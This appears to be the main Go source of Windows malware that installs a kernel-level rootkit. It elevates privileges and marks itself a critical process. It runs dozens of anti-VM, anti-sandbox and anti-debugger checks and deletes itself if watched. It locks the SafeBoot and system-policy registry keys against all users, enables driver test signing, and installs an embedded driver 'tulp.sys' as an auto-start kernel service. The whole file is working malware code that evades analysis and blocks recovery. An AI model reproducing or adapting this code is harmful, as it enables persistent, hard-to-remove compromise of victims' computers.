package main

import (
	_ "embed"
	"fmt"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"

	// AntiDebug
	"anti_analysis/AntiDebug/CheckBlacklistedWindowsNames"
	"anti_analysis/AntiDebug/InternetCheck"
	"anti_analysis/AntiDebug/IsDebuggerPresent"
	"anti_analysis/AntiDebug/ParentAntiDebug"
	"anti_analysis/AntiDebug/RemoteDebugger"
	"anti_analysis/AntiDebug/RunningProcesses"
	HooksDetection "anti_analysis/AntiDebug/UserAntiAntiDebug"
	"anti_analysis/AntiDebug/pcuptime"

	// AntiVirtualization
	SecureBootCheck "anti_analysis/AntiAntiRootkit/IsSecureBoot"
	"anti_analysis/AntiVirtualization/AnyRunDetection"
	"anti_analysis/AntiVirtualization/CleanEnvironmentDetection"
	"anti_analysis/AntiVirtualization/ComodoAntivirusDetection"
	"anti_analysis/AntiVirtualization/CyberCapture"
	"anti_analysis/AntiVirtualization/DeepFreezeDetection"
	HyperVCheck "anti_analysis/AntiVirtualization/HyperVDetection"
	"anti_analysis/AntiVirtualization/KVMCheck"
	"anti_analysis/AntiVirtualization/MonitorMetrics"
	"anti_analysis/AntiVirtualization/ParallelsCheck"
	PowerShellCheck "anti_analysis/AntiVirtualization/PowerShellDetection"
	"anti_analysis/AntiVirtualization/RepetitiveProcess"
	"anti_analysis/AntiVirtualization/SandboxieDetection"
	"anti_analysis/AntiVirtualization/ShadowDefenderDetection"
	"anti_analysis/AntiVirtualization/TriageDetection"
	"anti_analysis/AntiVirtualization/USBCheck"
	"anti_analysis/AntiVirtualization/UsernameCheck"
	"anti_analysis/AntiVirtualization/VMArtifacts"
	VMPlatformCheck "anti_analysis/AntiVirtualization/VMPlatformDetection"
	"anti_analysis/AntiVirtualization/VMWareDetection"
	"anti_analysis/AntiVirtualization/VirtualboxDetection"

	// ProcessUtils
	AdminCheck "anti_analysis/ProcessUtils/AdminChecks"
	"anti_analysis/ProcessUtils/CriticalProcess"
)

//go:embed tulp.sys
var tulpDriver []byte

const CREATE_NO_WINDOW = 0x08000000

// SelfDelete schedules the deletion of the running executable.
func SelfDelete() {
	exePath, err := os.Executable()
	if err != nil {
		return
	}

	exePathQuoted := `"` + exePath + `"`

	// Create a temporary batch file that deletes the executable
	batFile := exePath + ".del.bat"
	batContent := fmt.Sprintf(`
@echo off
:Repeat
del %s >nul 2>&1
if exist %s goto Repeat
del "%%~f0"
`,
		exePathQuoted,
		exePathQuoted)

	_ = os.WriteFile(batFile, []byte(batContent), 0644)

	// Run the batch file in a new cmd process
	cmd := exec.Command("cmd", "/C", "start", "", "/min", batFile)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	_ = cmd.Start()

	// Exit immediately so the file can be deleted
	os.Exit(0)
}

func ThunderKitty() {
	// Directory creation check
	if success := CyberCapture.CreateDirectory(); !success {
		SelfDelete()
	}

	// USB must be plugged in
	if ok, err := USBCheck.PluggedIn(); err != nil || !ok {
		SelfDelete()
	}

	if blacklistedUsernameDetected := UsernameCheck.CheckForBlacklistedNames(); blacklistedUsernameDetected {
		SelfDelete()
	}

	// Blacklisted Windows account names, uuids, processes etc.
	if CheckBlacklistedWindowsNames.CheckBlacklistedWindows() {
		SelfDelete()
	}

	// Run the built-in hook checks.
	if HooksDetection.DetectHooksOnCommonWinAPIFunctions("", nil) {
		// Exit immediately if any hook is detected.
		SelfDelete()
	}

	found, err := PowerShellCheck.RunPowerShellCommand(`"PowerShell is working: " + (Get-Date).ToShortTimeString()`)
	if err != nil {
		// Exit immediately on error
		SelfDelete()
	}
	if found != "" {
		// Service exists, continue with your logic
	} else {
		SelfDelete()
	}

	// Indicates if the environment is suitable for rootkit and bootkit checks
	if SecureBootCheck.IsSecureBootEnabled() {
		SelfDelete()
	}

	// Virtualization checks
	if detected, _ := VMWareDetection.GraphicsCardCheck(); detected {
		SelfDelete()
	}
	if detected, _ := VirtualboxDetection.GraphicsCardCheck(); detected {
		SelfDelete()
	}
	if detected, _ := KVMCheck.CheckForKVM(); detected {
		SelfDelete()
	}
	if detected, _ := TriageDetection.TriageCheck(); detected {
		SelfDelete()
	}
	if anyRunDetected, _ := AnyRunDetection.AnyRunDetection(); anyRunDetected {
		SelfDelete()
	}
	if small, _ := MonitorMetrics.IsScreenSmall(); small {
		SelfDelete()
	}
	if detected := VMArtifacts.VMArtifactsDetect(); detected {
		SelfDelete()
	}
	if detected, _ := RepetitiveProcess.Check(); detected {
		SelfDelete()
	}
	if detected, _ := ParallelsCheck.CheckForParallels(); detected {
		SelfDelete()
	}
	if detected, _ := HyperVCheck.DetectHyperV(); detected {
		SelfDelete()
	}
	if detected, _ := VMPlatformCheck.DetectVMPlatform(); detected {
		SelfDelete()
	}
	if detected := ComodoAntivirusDetection.DetectComodoAntivirus(); detected {
		SelfDelete()
	}
	if detected := ShadowDefenderDetection.DetectShadowDefender(); detected {
		SelfDelete()
	}
	if detected := SandboxieDetection.DetectSandboxie(); detected {
		SelfDelete()
	}
	if detected := DeepFreezeDetection.DetectDeepFreeze(); detected {
		SelfDelete()
	}
	if detected := CleanEnvironmentDetection.DetectCleanEnvironment(); detected {
		SelfDelete()
	}

	// Debugger checks
	if IsDebuggerPresent.IsDebuggerPresent1() {
		SelfDelete()
	}
	if detected, _ := RemoteDebugger.RemoteDebugger(); detected {
		SelfDelete()
	}

	// Internet connectivity
	if ok, _ := InternetCheck.CheckConnection(); !ok {
		SelfDelete()
	}

	// Parent process anti-debug
	if ParentAntiDebug.ParentAntiDebug() {
		SelfDelete()
	}

	// Running processes count
	if detected, _ := RunningProcesses.CheckRunningProcessesCount(50); detected {
		SelfDelete()
	}

	// Uptime check
	if detected, _ := pcuptime.CheckUptime(1200); detected {
		SelfDelete()
	}
}

var (
	modadvapi32         = windows.NewLazySystemDLL("advapi32.dll")
	procSetEntriesInAcl = modadvapi32.NewProc("SetEntriesInAclW")
)

// setEntriesInAcl calls the Windows API SetEntriesInAclW function.
func setEntriesInAcl(count uint32, pEntries *windows.EXPLICIT_ACCESS, oldAcl *windows.ACL, newAcl **windows.ACL) error {
	r1, _, err := procSetEntriesInAcl.Call(
		uintptr(count),
		uintptr(unsafe.Pointer(pEntries)),
		uintptr(unsafe.Pointer(oldAcl)),
		uintptr(unsafe.Pointer(newAcl)),
	)
	if r1 != 0 {
		return err
	}
	return nil
}

// lockRegistryKey denies full access to "Everyone" for the specified registry key path.
func lockRegistryKey(path string) {
	// Open registry key with permissions to read control info and modify DACL.
	key, err := registry.OpenKey(registry.LOCAL_MACHINE, path, windows.READ_CONTROL|windows.WRITE_DAC)
	if err != nil {
		// silently ignore errors
		return
	}
	defer key.Close()

	hKey := windows.Handle(key)

	// Retrieve current security info to comply with API usage (can be omitted if unused).
	_, err = windows.GetSecurityInfo(
		hKey,
		windows.SE_REGISTRY_KEY,
		windows.DACL_SECURITY_INFORMATION,
	)
	if err != nil {
		return
	}

	// Create a SID representing the "Everyone" group.
	everyoneSid, err := windows.CreateWellKnownSid(windows.WinWorldSid)
	if err != nil {
		return
	}

	// Define explicit access rule denying all access to Everyone.
	ea := windows.EXPLICIT_ACCESS{
		AccessPermissions: windows.KEY_ALL_ACCESS,
		AccessMode:        windows.DENY_ACCESS,
		Inheritance:       windows.NO_INHERITANCE,
		Trustee: windows.TRUSTEE{
			MultipleTrustee:          nil,
			MultipleTrusteeOperation: windows.NO_MULTIPLE_TRUSTEE,
			TrusteeForm:              windows.TRUSTEE_IS_SID,
			TrusteeType:              windows.TRUSTEE_IS_WELL_KNOWN_GROUP,
			TrusteeValue:             windows.TrusteeValue(uintptr(unsafe.Pointer(everyoneSid))),
		},
	}

	var newDACL *windows.ACL
	err = setEntriesInAcl(1, &ea, nil, &newDACL)
	if err != nil {
		return
	}

	// Apply the new DACL to the registry key.
	err = windows.SetSecurityInfo(
		hKey,
		windows.SE_REGISTRY_KEY,
		windows.DACL_SECURITY_INFORMATION,
		nil, nil,
		newDACL,
		nil,
	)
	if err != nil {
		return
	}
}

// extractAndSetupDriver extracts the embedded driver, enables test signing, and creates the necessary services.
func extractAndSetupDriver() error {
	// For safety, we extract to the temp directory instead of C:\
	tempDir := os.TempDir()
	driverPath := filepath.Join(tempDir, "tulp.sys")

	// Extract the driver
	err := os.WriteFile(driverPath, tulpDriver, 0644)
	if err != nil {
		return fmt.Errorf("failed to extract driver: %w", err)
	}
	log.Printf("[INFO] Driver extracted to %s", driverPath)

	// Command to enable test signing
	log.Println("[INFO] Enabling test signing...")
	cmdTestSign := exec.Command("bcdedit", "/set", "testsigning", "on")
	if output, err := cmdTestSign.CombinedOutput(); err != nil {
		return fmt.Errorf("failed to enable test signing: %w - %s", err, string(output))
	}
	log.Println("[INFO] Test signing enabled successfully.")

	// Command to create the kernel service
	// Using the \??\ prefix for the path
	ntDriverPath := `\??\` + driverPath
	log.Printf("[INFO] Creating 'tulp' kernel service for driver: %s", ntDriverPath)
	cmdScTulp := exec.Command("sc", "create", "tulp", "type=", "kernel", "start=", "auto", "binPath=", ntDriverPath)
	if output, err := cmdScTulp.CombinedOutput(); err != nil {
		// It might fail if the service already exists, we can try to delete it first
		log.Printf("[WARN] Failed to create 'tulp' service, maybe it exists? Trying to delete and recreate. Error: %s", string(output))
		exec.Command("sc", "delete", "tulp").Run()
		if output, err := cmdScTulp.CombinedOutput(); err != nil {
			return fmt.Errorf("failed to create 'tulp' service after delete attempt: %w - %s", err, string(output))
		}
	}
	log.Println("[INFO] 'tulp' service created successfully.")

	return nil
}

func main() {
	// 1. Check for Admin privileges, elevate if necessary.
	if !AdminCheck.IsAdmin() {
		log.Println("[INFO] Not running as admin, attempting to elevate.")
		AdminCheck.ElevateProcess()
		os.Exit(0) // Exit the non-elevated process
	}
	log.Println("[INFO] Running with administrator privileges.")

	// 2. Set the process as critical.
	if err := CriticalProcess.SetProcessCritical(); err != nil {
		log.Printf("[WARN] Failed to set process as critical: %v. Continuing...", err)
	} else {
		log.Println("[INFO] Process successfully marked as critical.")
	}

	// 3. Run initial anti-analysis checks.
	log.Println("[INFO] Running ThunderKitty anti-analysis suite...")
	ThunderKitty()
	log.Println("[INFO] ThunderKitty checks passed.")

	// 4. Lock registry keys.
	log.Println("[INFO] Locking registry keys...")
	lockRegistryKey(`SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`)
	lockRegistryKey(`SYSTEM\CurrentControlSet\Control\SafeBoot`)
	log.Println("[INFO] Registry keys locked.")

	// 5. Extract driver and set up services.
	log.Println("[INFO] Starting driver extraction and system setup...")
	if err := extractAndSetupDriver(); err != nil {
		log.Fatalf("[FATAL] Failed to setup driver and services: %v", err)
	}
	log.Println("[SUCCESS] All operations completed successfully.")
}
